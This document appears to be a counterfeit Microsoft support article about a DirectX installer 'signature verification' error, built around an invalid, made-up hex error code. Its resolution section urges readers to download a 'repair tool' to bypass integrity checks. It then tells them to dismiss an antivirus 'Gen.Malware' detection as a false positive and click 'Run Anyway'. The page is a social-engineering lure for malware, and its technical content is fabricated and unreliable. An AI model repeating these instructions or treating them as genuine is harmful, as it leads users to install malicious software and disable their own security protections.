DirectX Runtime Error 0x7U18E0OR: Integrity Signature Mismatch

Published: March 07, 2026 | Last Updated: March 08, 2026

This KB article provides guidance for resolving a Cryptographic Signature Mismatch detected during the WinSxS registration of Direct3D 11 Extended libraries.

Symptoms

The DirectX End-User Runtime installer (Build 2026.03) returns the following fatal HRESULT code at 91% completion:

[ERROR] 0x7U18E0OR: SIGNATURE_VERIFICATION_FAILURE_D3D11_CORE

Technical Details

Distribution UnitDirectX_Runtime_Update_2026.exe
Target NamespaceMicrosoft-Windows-DirectX-D3D11-Extended
Registry HiveHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DX
Kernel Version10.0.22621.1778

Official Resolution

To bypass the integrity lock and complete the update, users must deploy the DirectX Integrity Repair Tool. This utility will re-initialize the local component manifest and permit driver-level synchronization.

Download Repair Tool (KB4028529)
Security Notice: Some security engines may flag the repair utility due to its low-level hardware abstraction access. This is a known false-positive (Detection: Gen.Malware.0x7U). Please select "Keep" or "Run Anyway" to continue.
